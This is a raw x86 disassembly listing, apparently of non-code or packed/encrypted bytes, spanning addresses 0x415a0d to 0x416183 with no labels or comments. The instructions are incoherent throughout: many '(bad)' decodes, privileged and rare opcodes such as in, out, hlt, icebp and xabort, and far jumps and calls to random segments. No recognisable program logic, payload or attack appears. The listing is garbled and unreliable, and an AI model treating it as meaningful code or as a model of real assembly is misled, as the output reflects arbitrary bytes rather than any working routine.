  415a0d:	ja     0x4159dd
  415a0f:	xchg   esi,eax
  415a10:	sub    DWORD PTR [edi],ebx
  415a12:	or     ecx,esi
  415a14:	stos   DWORD PTR es:[edi],eax
  415a15:	xor    al,0x81
  415a17:	pop    ebp
  415a18:	not    BYTE PTR [ebp-0xd]
  415a1b:	and    dh,dl
  415a1d:	inc    esi
  415a1e:	aam    0xe4
  415a20:	fwait
  415a21:	push   ecx
  415a22:	mov    ecx,0x72f94ea3
  415a27:	push   edx
  415a28:	push   0xacb6a394
  415a2d:	mov    ch,0x8a
  415a2f:	jle    0x4159dc
  415a31:	enter  0xf4ab,0xa4
  415a35:	mov    edi,DWORD PTR [ebx-0xc]
  415a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a39:	ffree  st(2)
  415a3b:	aad    0x21
  415a3d:	add    DWORD PTR [ecx+0x57ed9b00],0x2e
  415a44:	call   0x56b797ee
  415a49:	bound  esi,QWORD PTR [ecx+0x65]
  415a4c:	aam    0xbe
  415a4e:	arpl   WORD PTR [esi-0x15],cx
  415a51:	ja     0x415a61
  415a53:	jnp    0x415a25
  415a55:	sbb    DWORD PTR [esi-0x255ec3ad],esi
  415a5b:	jmp    FWORD PTR [ebx-0x4b]
  415a5e:	cmp    DWORD PTR ss:[esi-0x7de0d3a7],ebx
  415a65:	es or  eax,0x56ba0508
  415a6b:	jno    0x415ada
  415a6d:	out    dx,eax
  415a6e:	mov    dh,0xda
  415a70:	jge    0x415a0a
  415a72:	sbb    esi,DWORD PTR [edx+0x3ab199d5]
  415a78:	leave  
  415a79:	xchg   ebp,eax
  415a7a:	lods   eax,DWORD PTR ds:[esi]
  415a7b:	cmp    bl,BYTE PTR [ebx-0x8]
  415a7e:	cwde   
  415a7f:	mov    ch,BYTE PTR [edx]
  415a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a82:	shl    BYTE PTR [ebx],cl
  415a84:	jg     0x415a65
  415a86:	shr    BYTE PTR ds:0x14331000,1
  415a8c:	mov    ds:0xb230a0a,al
  415a91:	bnd jns 0x415a99
  415a94:	add    esp,eax
  415a96:	mov    esp,0x261057a6
  415a9b:	push   edi
  415a9c:	sbb    DWORD PTR ds:0x438d4ffd,ebp
  415aa2:	stos   BYTE PTR es:[edi],al
  415aa3:	arpl   WORD PTR [ebx],bp
  415aa5:	dec    ecx
  415aa6:	in     eax,0xdc
  415aa8:	js     0x415a54
  415aaa:	mov    ebx,0xacdd560b
  415aaf:	add    DWORD PTR [esi-0x65],0xffffffe3
  415ab3:	add    eax,DWORD PTR [esp+edx*1+0x74]
  415ab7:	mov    esp,0xbff780d4
  415abc:	pop    ds
  415abd:	dec    ecx
  415abe:	pusha  
  415abf:	arpl   WORD PTR [ecx],sp
  415ac1:	popf   
  415ac2:	push   edx
  415ac3:	or     eax,0xd28c52e8
  415ac8:	or     BYTE PTR [ebx+0x3a1e958b],bl
  415ace:	lods   eax,DWORD PTR ds:[esi]
  415acf:	test   al,0xbe
  415ad1:	shl    BYTE PTR [ebx],1
  415ad3:	inc    edi
  415ad4:	adc    DWORD PTR [edi-0x4a173484],ebp
  415ada:	call   0xe14e1f78
  415adf:	cs dec esi
  415ae1:	xor    eax,0x87a70e4d
  415ae6:	leave  
  415ae7:	call   0x7b1b6b50
  415aec:	cs inc edx
  415aee:	mov    ah,0xf
  415af0:	mov    eax,ds:0xec337d7
  415af5:	xor    ebx,DWORD PTR [eax]
  415af7:	pop    edi
  415af8:	pop    edx
  415af9:	ss push esp
  415afb:	jp     0x415b6b
  415afd:	mov    edx,DWORD PTR [eax-0x53]
  415b00:	or     esi,DWORD PTR [edx-0x41]
  415b03:	mov    ah,0x15
  415b05:	and    al,0xb4
  415b07:	enter  0x2c44,0x8f
  415b0b:	dec    ebp
  415b0c:	xchg   ebx,eax
  415b0d:	jge    0x415b00
  415b0f:	(bad)  
  415b10:	pop    esi
  415b11:	xor    BYTE PTR [esi],al
  415b13:	and    BYTE PTR [ebx],ah
  415b15:	mov    dh,BYTE PTR [esi]
  415b17:	not    BYTE PTR [ebp+ebx*2+0x40f810f8]
  415b1e:	in     eax,0x98
  415b20:	add    eax,0x337a08d0
  415b25:	lahf   
  415b26:	bound  ecx,QWORD PTR [eax]
  415b28:	lds    esp,FWORD PTR [ebp+eiz*2-0x73cd23b6]
  415b2f:	jb     0x415b0e
  415b31:	icebp  
  415b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b33:	xchg   ecx,eax
  415b34:	add    al,BYTE PTR [ecx-0x4b]
  415b37:	add    edi,DWORD PTR [eax+0x71]
  415b3a:	fnstcw WORD PTR [ebx-0x462ba825]
  415b40:	jp     0x415b6a
  415b42:	fsub   DWORD PTR [ebx+0x58]
  415b45:	mov    esi,0xd7db0126
  415b4a:	std    
  415b4b:	mov    bl,0xff
  415b4d:	xchg   ebx,eax
  415b4e:	mov    esp,DWORD PTR [edi-0x67]
  415b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b52:	dec    eax
  415b53:	push   esp
  415b54:	out    dx,eax
  415b55:	call   0x41cf:0x6b167aec
  415b5c:	jg     0x415bb7
  415b5e:	mov    ebx,DWORD PTR [ecx]
  415b60:	cmp    DWORD PTR [eax],esi
  415b62:	add    al,0x47
  415b64:	ds (bad) 
  415b66:	arpl   WORD PTR [esi],si
  415b68:	mov    al,0x9
  415b6a:	mov    ss,WORD PTR [ecx+0x57e25974]
  415b70:	mov    edx,0x79f1c0c0
  415b75:	dec    edi
  415b76:	sbb    al,0x3f
  415b78:	popf   
  415b79:	mov    ah,al
  415b7b:	inc    esi
  415b7c:	repz jle 0x415b96
  415b7f:	push   esi
  415b80:	bound  esp,QWORD PTR [ecx]
  415b82:	mov    al,ds:0xdc40b4be
  415b87:	pop    ebx
  415b88:	pop    ss
  415b89:	repz sub al,0xe4
  415b8c:	bound  esp,QWORD PTR [ebx]
  415b8e:	inc    ebp
  415b8f:	pop    ss
  415b90:	ret    0x4274
  415b93:	into   
  415b94:	xor    dl,BYTE PTR [edi+0x78]
  415b97:	gs fcomp st(7)
  415b9a:	outs   dx,DWORD PTR ds:[esi]
  415b9b:	mov    esp,0xe11f18a2
  415ba0:	(bad)  
  415ba1:	pop    ebp
  415ba2:	sar    DWORD PTR [ebp+ebx*1-0xa],1
  415ba6:	xor    eax,0x8e8f74cc
  415bab:	ror    DWORD PTR [esi+eiz*4-0x71],cl
  415baf:	loope  0x415b93
  415bb1:	pop    eax
  415bb2:	add    eax,0x9bda7a5b
  415bb7:	(bad)  
  415bb8:	push   ss
  415bb9:	and    cl,BYTE PTR [ebp+0x395b37ae]
  415bbf:	loop   0x415b70
  415bc1:	xlat   BYTE PTR ds:[ebx]
  415bc2:	push   ebp
  415bc3:	or     dl,BYTE PTR [ecx-0x56611c7b]
  415bc9:	cwde   
  415bca:	mov    DWORD PTR [edx+0x7f],ebp
  415bcd:	inc    esp
  415bce:	mov    edx,0xdcb27874
  415bd3:	jge    0x415ba5
  415bd5:	sbb    BYTE PTR [ecx+0x127ed70b],ch
  415bdb:	in     al,0xfe
  415bdd:	lds    esi,FWORD PTR [ebx-0x4c2106ad]
  415be3:	mov    ds:0x6af3b735,al
  415be8:	int3   
  415be9:	or     eax,0xee9fb4a4
  415bee:	mov    ebx,DWORD PTR [edx]
  415bf0:	scas   eax,DWORD PTR es:[edi]
  415bf1:	in     al,0x0
  415bf3:	mov    esp,DWORD PTR [eax+0x7d56f7d7]
  415bf9:	int    0xc5
  415bfb:	iret   
  415bfc:	jb     0x415c37
  415bfe:	xchg   ebp,eax
  415bff:	aaa    
  415c00:	xlat   BYTE PTR ds:[ebx]
  415c01:	out    0x2c,eax
  415c03:	inc    ebx
  415c04:	xchg   edx,eax
  415c05:	pop    edx
  415c06:	daa    
  415c07:	dec    ebp
  415c08:	ja     0x415bcb
  415c0a:	add    cl,BYTE PTR [ecx+0x45]
  415c0d:	into   
  415c0e:	add    BYTE PTR [esp+edi*8-0x3c4a34a0],dl
  415c15:	(bad)
  415c19:	loop   0x415bb2
  415c1b:	(bad)  
  415c1d:	xchg   DWORD PTR [ebx-0x5aca0805],eax
  415c23:	stc    
  415c24:	lods   eax,DWORD PTR ds:[esi]
  415c25:	call   0xacd0c76d
  415c2a:	jno    0x415c54
  415c2c:	test   DWORD PTR [eax-0xb],ecx
  415c2f:	loope  0x415bed
  415c31:	xor    al,0xb9
  415c33:	mov    BYTE PTR [edx+edi*2+0x2750e6de],dh
  415c3a:	mov    dl,0xe6
  415c3c:	sbb    eax,0xe931cb6b
  415c41:	inc    eax
  415c42:	or     bl,BYTE PTR [eax+eax*4+0x2a5a674e]
  415c49:	scas   al,BYTE PTR es:[edi]
  415c4a:	jge    0x415c93
  415c4c:	mov    dh,0xe7
  415c4e:	sub    DWORD PTR [ebp-0x78d255ef],ecx
  415c54:	mov    dh,0x7c
  415c56:	fldenv [edi]
  415c58:	xlat   BYTE PTR ds:[ebx]
  415c59:	and    al,0x38
  415c5b:	xor    esi,ecx
  415c5d:	push   edi
  415c5e:	inc    esi
  415c5f:	jno    0x415bfd
  415c61:	sbb    DWORD PTR [ebp-0xd],eax
  415c64:	cmp    edx,DWORD PTR [edx+ebp*1+0x3f]
  415c68:	jnp    0x415c37
  415c6a:	xabort 0x8f
  415c6d:	and    esi,DWORD PTR [edi]
  415c6f:	mov    ds:0x1a1b06dc,eax
  415c74:	mov    eax,ds:0xc1a3ce95
  415c79:	cmp    eax,0xf0440e07
  415c7e:	retf   0xe473
  415c81:	fs inc edi
  415c83:	fist   WORD PTR [edx+0x59]
  415c86:	shr    DWORD PTR [ecx+0x77f93d20],cl
  415c8c:	outs   dx,BYTE PTR ds:[esi]
  415c8d:	ins    BYTE PTR es:[edi],dx
  415c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8f:	xchg   ebp,eax
  415c90:	dec    ecx
  415c91:	jb     0x415cd0
  415c93:	idiv   DWORD PTR [ecx+0x6ca70278]
  415c99:	stc    
  415c9a:	push   cs
  415c9b:	ss jns 0x415ce6
  415c9e:	int3   
  415c9f:	lods   al,BYTE PTR ds:[esi]
  415ca0:	std    
  415ca1:	sti    
  415ca2:	dec    ebx
  415ca3:	add    DWORD PTR [esi],edx
  415ca5:	inc    edi
  415ca6:	mov    dl,0xad
  415ca8:	in     eax,dx
  415ca9:	pop    eax
  415caa:	mov    al,0x31
  415cac:	push   ebx
  415cad:	fnstcw WORD PTR [esi-0x52f86d70]
  415cb3:	add    DWORD PTR [edx-0x48],edi
  415cb6:	lahf   
  415cb7:	xchg   ecx,eax
  415cb8:	imul   eax,DWORD PTR [eax-0x2f],0xffffff96
  415cbc:	sbb    DWORD PTR [edx+edi*1],esp
  415cbf:	and    al,0xb1
  415cc1:	mov    ch,0xc8
  415cc3:	popf   
  415cc4:	test   DWORD PTR [ebp-0x6f],0x40376161
  415ccb:	pop    ebp
  415ccc:	je     0x415c9c
  415cce:	mov    dl,0x56
  415cd0:	mov    esp,0x74c11b1e
  415cd5:	jecxz  0x415c9b
  415cd7:	mov    esi,0x2f45c47f
  415cdc:	lods   al,BYTE PTR ds:[esi]
  415cdd:	mov    eax,0xde52d672
  415ce2:	xchg   ebx,eax
  415ce3:	dec    edi
  415ce4:	xor    al,0x11
  415ce6:	dec    eax
  415ce7:	pop    edx
  415ce8:	imul   ebx,DWORD PTR [eax],0x2a516f40
  415cee:	and    al,0x90
  415cf0:	jecxz  0x415c73
  415cf2:	xchg   edx,eax
  415cf3:	fldcw  WORD PTR [edx+edx*2-0x69bee784]
  415cfa:	test   eax,0xe55a5485
  415cff:	loop   0x415d77
  415d01:	inc    ebp
  415d02:	dec    ecx
  415d03:	in     eax,dx
  415d04:	mov    DWORD PTR [ecx],ecx
  415d06:	jmp    0x4734:0xcd1532b8
  415d0d:	xor    BYTE PTR [ebp+0x6c],dl
  415d10:	pop    ecx
  415d11:	xchg   edx,eax
  415d12:	push   ebx
  415d13:	sbb    eax,0x93ab1f7c
  415d18:	sub    eax,0x20f39150
  415d1d:	jle    0x415ca9
  415d1f:	mov    ds:0x1db7786,al
  415d24:	push   ecx
  415d25:	imul   ecx,DWORD PTR [esi+ecx*2],0x6abc4b82
  415d2c:	cwde   
  415d2d:	add    eax,ebx
  415d2f:	pop    edx
  415d30:	pop    edi
  415d31:	add    bl,BYTE PTR [edx+0x42aa81aa]
  415d37:	or     DWORD PTR [esi-0x49],edi
  415d3a:	pop    edi
  415d3b:	dec    ebx
  415d3c:	and    eax,0xe8bb468b
  415d41:	mov    dx,0xf9e8
  415d45:	in     al,0xa3
  415d47:	sbb    BYTE PTR [ecx],ah
  415d49:	sbb    edi,DWORD PTR [esi+0x55324a79]
  415d4f:	dec    ecx
  415d50:	sub    al,0xee
  415d52:	xchg   esp,eax
  415d53:	daa    
  415d54:	and    DWORD PTR [eax],esp
  415d56:	jecxz  0x415dd7
  415d58:	push   esi
  415d59:	dec    esp
  415d5a:	jmp    0xacbc:0xc381ad3d
  415d61:	popf   
  415d62:	push   es
  415d63:	aas    
  415d64:	jmp    0x2c2d:0xa4cb4402
  415d6b:	inc    esp
  415d6c:	and    ecx,DWORD PTR [ecx]
  415d6e:	dec    ebp
  415d6f:	or     al,0xd1
  415d71:	push   0x47
  415d73:	fcmovbe st,st(6)
  415d75:	sub    DWORD PTR [ebx-0x6dca99bb],0x6c
  415d7c:	in     eax,dx
  415d7d:	pop    es
  415d7e:	xchg   ebx,eax
  415d7f:	mul    BYTE PTR [ecx+0xa]
  415d82:	lock sbb ah,0x1a
  415d86:	jg     0x415d26
  415d88:	out    0xd2,al
  415d8a:	adc    DWORD PTR [ebx+edi*4+0x64498ac4],0x62
  415d92:	or     ecx,DWORD PTR [eax]
  415d94:	adc    BYTE PTR [ecx+0xc484ba0],dl
  415d9a:	inc    eax
  415d9b:	fdivr  QWORD PTR [edx-0x6c]
  415d9e:	sub    cl,BYTE PTR [ecx+0x18dae279]
  415da4:	cmp    esp,DWORD PTR [ecx+0x30]
  415da7:	push   esp
  415da8:	or     al,ch
  415daa:	icebp  
  415dab:	dec    ebp
  415dac:	sub    BYTE PTR [ecx-0x69],ch
  415daf:	jbe    0x415e10
  415db1:	jp     0x415d4a
  415db3:	xor    DWORD PTR [esi],edx
  415db5:	pop    edx
  415db6:	mov    esi,0x83a0d1e6
  415dbb:	cmp    al,0xea
  415dbd:	mov    WORD PTR [eax-0xd],es
  415dc0:	dec    ecx
  415dc1:	cmp    al,BYTE PTR ds:0x6195fc90
  415dc7:	sub    DWORD PTR [ebx],0xffffffaa
  415dca:	xor    bl,dl
  415dcc:	rol    BYTE PTR [ebx-0x4b],1
  415dcf:	inc    edi
  415dd0:	mov    ebx,0x41b911cc
  415dd5:	pop    ss
  415dd6:	popa   
  415dd7:	adc    BYTE PTR [ebp+0x72],dh
  415dda:	in     al,dx
  415ddb:	xlat   BYTE PTR ds:[ebx]
  415ddc:	test   al,0xdd
  415dde:	nop
  415ddf:	push   ds
  415de0:	mov    cl,0xd3
  415de2:	fs popf 
  415de4:	mov    ecx,0x8bef1ef3
  415de9:	push   0xe03d45b2
  415dee:	sar    DWORD PTR [eax-0x6fb19b3f],cl
  415df4:	mov    dl,ch
  415df6:	sbb    eax,0x1dc4cf29
  415dfb:	into   
  415dfc:	xchg   ecx,eax
  415dfd:	inc    ebp
  415dfe:	mov    BYTE PTR [esi+0x2309ba35],cl
  415e04:	frstor [esi+0x26]
  415e07:	push   edi
  415e08:	xchg   ecx,eax
  415e09:	dec    edx
  415e0a:	sub    cl,BYTE PTR [ebx+0x2bcdbc38]
  415e10:	lahf   
  415e11:	cmp    ecx,DWORD PTR [edx+edi*8+0x49]
  415e15:	pop    ds
  415e16:	inc    edx
  415e17:	cmp    esi,DWORD PTR cs:[ecx]
  415e1a:	push   ebp
  415e1b:	add    BYTE PTR [eax+0x71c6f64d],dh
  415e21:	dec    edi
  415e22:	out    0x22,eax
  415e24:	pop    esi
  415e25:	out    dx,al
  415e26:	and    eax,ebp
  415e28:	adc    ecx,DWORD PTR [ebx]
  415e2a:	mov    bl,0x3
  415e2c:	sti    
  415e2d:	aaa    
  415e2e:	or     eax,DWORD PTR [ecx-0x4c627b40]
  415e34:	inc    ebp
  415e35:	cwde   
  415e36:	aad    0x78
  415e38:	xchg   dh,bh
  415e3a:	pop    ebx
  415e3b:	inc    edx
  415e3c:	js     0x415e40
  415e3e:	jmp    FWORD PTR [eax-0x747c4306]
  415e44:	or     al,dh
  415e46:	pop    edi
  415e47:	stos   BYTE PTR es:[edi],al
  415e48:	lds    esi,FWORD PTR [edi+0x58]
  415e4b:	in     al,dx
  415e4c:	call   0xf0ab1a09
  415e51:	mov    al,ds:0x69b11b56
  415e56:	fld    DWORD PTR [edx-0x55]
  415e59:	add    dl,BYTE PTR [edx+esi*1]
  415e5c:	leave  
  415e5d:	and    edi,DWORD PTR [edx-0x6a]
  415e60:	mov    eax,0xed26341d
  415e65:	mov    ds:0xfdc726ff,eax
  415e6a:	push   es
  415e6b:	inc    esp
  415e6c:	neg    BYTE PTR [ecx]
  415e6e:	sub    al,0x51
  415e70:	repz test DWORD PTR [ecx-0x6d0ad25b],eax
  415e77:	les    eax,FWORD PTR [edi]
  415e79:	cs xor ecx,esp
  415e7c:	pop    eax
  415e7d:	cwde   
  415e7e:	xlat   BYTE PTR ds:[ebx]
  415e7f:	in     al,dx
  415e80:	stos   DWORD PTR es:[edi],eax
  415e81:	rcl    DWORD PTR [edx+0x722a7f5],0x6f
  415e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e89:	cli    
  415e8a:	ja     0x415ead
  415e8c:	sub    BYTE PTR [ebp-0x762f9a2a],0xeb
  415e93:	outs   dx,DWORD PTR ds:[esi]
  415e94:	sbb    dl,dh
  415e96:	xlat   BYTE PTR ds:[ebx]
  415e97:	fwait
  415e98:	pop    esi
  415e99:	mov    al,0xd2
  415e9b:	repnz (bad) 
  415e9d:	xor    eax,0xf07c6c76
  415ea2:	aaa    
  415ea3:	sbb    bl,BYTE PTR [esi-0x7b]
  415ea6:	(bad)  
  415ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ea9:	cwde   
  415eaa:	dec    ebx
  415eab:	jmp    0xd6357917
  415eb0:	lods   al,BYTE PTR ds:[esi]
  415eb1:	jg     0x415ed8
  415eb3:	xlat   BYTE PTR ds:[ebx]
  415eb4:	or     eax,0x1062e3b6
  415eb9:	fnsave [ebx-0x41]
  415ebc:	into   
  415ebd:	pushf  
  415ebe:	adc    al,0x1
  415ec0:	sbb    DWORD PTR [ecx-0x6b],ecx
  415ec3:	xlat   BYTE PTR ds:[ebx]
  415ec4:	fwait
  415ec5:	push   ebx
  415ec6:	(bad)  
  415ec7:	shr    DWORD PTR [edi],0xa6
  415eca:	jnp    0x415f10
  415ecc:	pushw  cs
  415ece:	outs   dx,DWORD PTR ds:[esi]
  415ecf:	ret    0x403f
  415ed2:	ds rcr esp,0x2b
  415ed6:	push   ds
  415ed7:	test   eax,0x9c270e67
  415edc:	(bad)  
  415edd:	aam    0x39
  415edf:	cwde   
  415ee0:	xor    edx,DWORD PTR [eax-0x4ad2eb08]
  415ee6:	jge    0x415f30
  415ee8:	jl     0x415ee8
  415eea:	or     DWORD PTR [edx],ebp
  415eec:	mov    bl,0x62
  415eee:	inc    ebp
  415eef:	or     DWORD PTR [ebp+edx*2-0x2a4e0f47],ebx
  415ef6:	jl     0x415e7a
  415ef8:	sub    BYTE PTR [ebp+0xac81e14],bl
  415efe:	outs   dx,DWORD PTR ds:[esi]
  415eff:	stos   DWORD PTR es:[edi],eax
  415f00:	fisubr WORD PTR ds:0xc8f76c99
  415f06:	loop   0x415f6f
  415f08:	add    edx,DWORD PTR [ebx+0x2b]
  415f0b:	sbb    al,dh
  415f0d:	add    dl,BYTE PTR [ebx+0x11]
  415f10:	pop    esp
  415f11:	mov    esi,0xa26bf26e
  415f16:	inc    esi
  415f17:	pop    esp
  415f18:	xchg   ecx,eax
  415f19:	sub    al,0x58
  415f1b:	int    0x99
  415f1d:	push   cs
  415f1e:	call   0x90e5:0xf2d5c9f3
  415f25:	stos   BYTE PTR es:[edi],al
  415f26:	mov    esp,DWORD PTR gs:[edx-0x76a661d4]
  415f2d:	pop    esp
  415f2e:	imul   ecx,ebx,0x2d32d4a6
  415f34:	mov    bl,0xd2
  415f36:	add    DWORD PTR [edi-0x7ecb793a],ebx
  415f3c:	mov    edx,0xe58050c7
  415f41:	bound  esi,QWORD PTR es:[ebx+0x6f]
  415f45:	pop    ecx
  415f46:	mov    esi,esp
  415f48:	mov    cl,0xaf
  415f4a:	mov    ebp,eax
  415f4c:	das    
  415f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f4e:	pop    eax
  415f4f:	sbb    al,0xb1
  415f51:	jmp    0x415f4e
  415f53:	and    DWORD PTR [edx-0x1a],0xffffffc1
  415f57:	dec    edx
  415f58:	mov    cl,0xc5
  415f5a:	and    cl,BYTE PTR [esi]
  415f5c:	xor    ah,BYTE PTR [edi+0x21]
  415f5f:	fwait
  415f60:	xchg   ebp,eax
  415f61:	or     al,0x3
  415f63:	fbstp  TBYTE PTR [esi-0x26]
  415f66:	add    eax,0x239e29b6
  415f6b:	mov    ds:0x921ee0ee,eax
  415f70:	hlt    
  415f71:	xor    al,0xda
  415f73:	inc    ebx
  415f74:	loope  0x415f6c
  415f76:	shr    dl,1
  415f78:	and    DWORD PTR [eax+0xb872574],ebp
  415f7e:	mov    ecx,0xb88b548
  415f83:	stos   DWORD PTR es:[edi],eax
  415f84:	xchg   edx,eax
  415f85:	iret   
  415f86:	xchg   esp,eax
  415f87:	jmp    0x2cbe59b6
  415f8c:	jge    0x415ff4
  415f8e:	inc    edi
  415f8f:	cdq    
  415f90:	add    ecx,edx
  415f92:	fs xor al,0x3c
  415f95:	into   
  415f96:	xchg   ecx,eax
  415f97:	inc    ebp
  415f98:	cdq    
  415f99:	shr    DWORD PTR [ebx],0x8b
  415f9c:	cdq    
  415f9d:	leave  
  415f9e:	pop    ebx
  415f9f:	mul    ecx
  415fa1:	ins    DWORD PTR es:[edi],dx
  415fa2:	add    ebx,DWORD PTR [ebx-0x481162f2]
  415fa8:	js     0x415fe6
  415faa:	sbb    eax,0x9e478abb
  415faf:	popf   
  415fb0:	jecxz  0x41600d
  415fb2:	call   0xe2bc:0xb798b95d
  415fb9:	jae    0x416005
  415fbb:	ja     0x415f4d
  415fbd:	dec    ebp
  415fbe:	jmp    0x1c418452
  415fc3:	in     eax,0x9a
  415fc5:	fstp   DWORD PTR [ebp+0x129ff4f5]
  415fcb:	and    bh,ch
  415fcd:	pop    edi
  415fce:	outs   dx,DWORD PTR ds:[esi]
  415fcf:	into   
  415fd0:	sahf   
  415fd1:	xchg   edi,eax
  415fd2:	inc    ebp
  415fd3:	outs   dx,BYTE PTR es:[esi]
  415fd5:	cmc    
  415fd6:	sub    dh,dl
  415fd8:	pop    esi
  415fd9:	je     0x416044
  415fdb:	mov    ch,0xf0
  415fdd:	inc    ecx
  415fde:	adc    DWORD PTR [ebx],0x9275dcf3
  415fe4:	mov    esi,0x69c77c24
  415fe9:	arpl   di,bp
  415feb:	cmp    al,0x3e
  415fed:	scas   eax,DWORD PTR es:[edi]
  415fee:	cmp    eax,0xa55defbb
  415ff3:	pop    edx
  415ff4:	inc    edi
  415ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff6:	dec    ebp
  415ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff8:	mov    es,WORD PTR [ecx]
  415ffa:	jmp    0x41602b
  415ffc:	xor    eax,0xcdd6bd2a
  416001:	xor    DWORD PTR [edx+eax*1-0x67],0xd66ed9e6
  416009:	or     al,0xbb
  41600b:	sti    
  41600c:	jg     0x415fd7
  41600e:	icebp  
  41600f:	int3   
  416010:	and    esi,edi
  416012:	retf   0x618b
  416015:	pop    ebp
  416016:	xchg   ebp,eax
  416017:	mov    eax,ds:0xc938c2c3
  41601c:	pusha  
  41601d:	push   es
  41601e:	sbb    bh,BYTE PTR [esp+edx*2+0xaca9df8]
  416025:	sub    al,0xc9
  416027:	dec    ebp
  416028:	js     0x41608f
  41602a:	rcr    edi,0x82
  41602d:	mov    bh,0x62
  41602f:	ss ins DWORD PTR es:[edi],dx
  416031:	xor    al,0x65
  416033:	push   ds
  416034:	stos   BYTE PTR es:[edi],al
  416035:	icebp  
  416036:	mov    DWORD PTR [ebx],ecx
  416038:	fist   DWORD PTR [ebp+0x681ef42]
  41603e:	inc    ebx
  41603f:	sar    DWORD PTR gs:[edx-0x45],0xf8
  416044:	pop    edx
  416045:	jne    0x4160bd
  416047:	push   0x1e2c329c
  41604c:	dec    eax
  41604d:	jl     0x41604a
  41604f:	nop
  416050:	in     al,0x4c
  416052:	pop    ebx
  416053:	mov    dl,BYTE PTR [esi+0x3f]
  416056:	xor    ch,BYTE PTR [esp+edi*2-0x4c]
  41605a:	gs jl  0x416003
  41605d:	xor    edi,DWORD PTR [edi+0x26]
  416060:	pop    eax
  416061:	ins    BYTE PTR es:[edi],dx
  416062:	test   DWORD PTR [esi-0x190598f],0xf55812a7
  41606c:	pop    ds
  41606d:	pop    esp
  41606e:	adc    al,ch
  416070:	xchg   esp,eax
  416071:	pop    edx
  416072:	adc    ah,BYTE PTR [edx+0x8b0f8f6]
  416078:	loopne 0x41609f
  41607a:	in     eax,0x7f
  41607c:	je     0x41605b
  41607e:	pop    ebp
  41607f:	mov    bl,0xdb
  416081:	out    dx,eax
  416082:	dec    ecx
  416083:	call   0xa7833794
  416088:	sub    al,0x7d
  41608a:	pushf  
  41608b:	dec    edx
  41608c:	dec    eax
  41608d:	enter  0xd944,0x2e
  416091:	pop    ss
  416092:	add    BYTE PTR [ebx+0x2283b095],0x6
  416099:	pop    esi
  41609a:	xchg   BYTE PTR [ecx-0x33434c20],bh
  4160a0:	or     BYTE PTR [ecx+0x30],ch
  4160a3:	retf   
  4160a4:	int3   
  4160a5:	(bad)  
  4160a6:	outs   dx,BYTE PTR ds:[esi]
  4160a7:	pop    edi
  4160a8:	add    al,0x49
  4160aa:	jp     0x416054
  4160ac:	pop    ds
  4160ad:	and    DWORD PTR [edx],ecx
  4160af:	hlt    
  4160b0:	push   es
  4160b1:	lods   eax,DWORD PTR ds:[esi]
  4160b2:	xchg   esp,eax
  4160b3:	stos   BYTE PTR es:[edi],al
  4160b4:	ror    DWORD PTR [ebx-0x5169e43f],0xa4
  4160bb:	div    DWORD PTR [edx+ebx*4]
  4160be:	inc    ecx
  4160bf:	adc    dh,BYTE PTR [ecx+eiz*4-0x4]
  4160c3:	inc    ebp
  4160c4:	pushf  
  4160c5:	outs   dx,BYTE PTR ds:[esi]
  4160c6:	ror    esp,1
  4160c8:	dec    eax
  4160c9:	mov    al,BYTE PTR [edi-0x8d0e259]
  4160cf:	push   ebx
  4160d0:	loopne 0x4160e3
  4160d2:	mov    gs,WORD PTR ds:[eax]
  4160d5:	jg     0x4160bb
  4160d7:	(bad)  
  4160d9:	stc    
  4160da:	or     ecx,ecx
  4160dc:	sti    
  4160dd:	mov    esi,fs
  4160df:	fisub  WORD PTR [ebx+0x605ddfdb]
  4160e5:	jae    0x416110
  4160e7:	mov    al,ds:0x572f3bc3
  4160ec:	adc    DWORD PTR [eax-0xe],ebx
  4160ef:	lock clc 
  4160f1:	cdq    
  4160f2:	test   ebx,ecx
  4160f4:	stos   DWORD PTR es:[edi],eax
  4160f5:	xchg   BYTE PTR [edi-0x4c],bh
  4160f8:	mov    ecx,0x6d375e7a
  4160fd:	mov    esi,0x8c45580a
  416102:	pop    ebp
  416103:	retf   
  416104:	mov    cl,0x1e
  416106:	ror    DWORD PTR [ecx+0x6c6945d9],0x68
  41610d:	add    BYTE PTR [esi+0x15],dl
  416110:	jmp    0x416095
  416112:	retf   0x2841
  416115:	call   0xdd10919c
  41611a:	je     0x4160c8
  41611c:	or     BYTE PTR [ebx-0x29569a3f],ah
  416122:	add    eax,0x5ce2a1cc
  416127:	xchg   ebx,eax
  416128:	sbb    ch,bh
  41612a:	add    DWORD PTR [eax],ebp
  41612c:	outs   dx,DWORD PTR ds:[esi]
  41612d:	sbb    eax,0x7d0a896e
  416132:	inc    esp
  416133:	int    0x1a
  416135:	ret    
  416136:	xchg   ebp,eax
  416137:	(bad)  
  416139:	nop
  41613a:	push   esp
  41613b:	(bad)
  41613e:	pop    eax
  41613f:	outs   dx,DWORD PTR ds:[esi]
  416140:	(bad)  
  416141:	jnp    0x4160c6
  416143:	out    dx,eax
  416144:	jno    0x4160c9
  416146:	mov    bl,0x61
  416148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416149:	cmp    al,0xfa
  41614b:	cmc    
  41614c:	std    
  41614d:	xchg   esi,eax
  41614e:	stc    
  41614f:	dec    BYTE PTR [eax]
  416151:	xor    BYTE PTR [eax-0x57995552],bl
  416157:	dec    eax
  416158:	test   eax,0x1187dff
  41615d:	push   edx
  41615e:	jg     0x41616d
  416160:	dec    edx
  416161:	sbb    BYTE PTR [edx-0xce54365],ch
  416167:	xlat   BYTE PTR ds:[ebx]
  416168:	shr    esi,0x4a
  41616b:	sbb    eax,0xfe1c5c4b
  416171:	pop    ds
  416172:	xchg   BYTE PTR [eax+0x24],ah
  416175:	xchg   ecx,eax
  416176:	mov    BYTE PTR [esi],ah
  416178:	aad    0xa3
  41617a:	ins    DWORD PTR es:[edi],dx
  41617b:	fistp  WORD PTR [edx+0xe]
  41617e:	jg     0x416158
  416180:	sub    DWORD PTR [edx-0x57],ebp
  416183:	test   DWORD PTR [eax+eax*4],0xbf85f1af
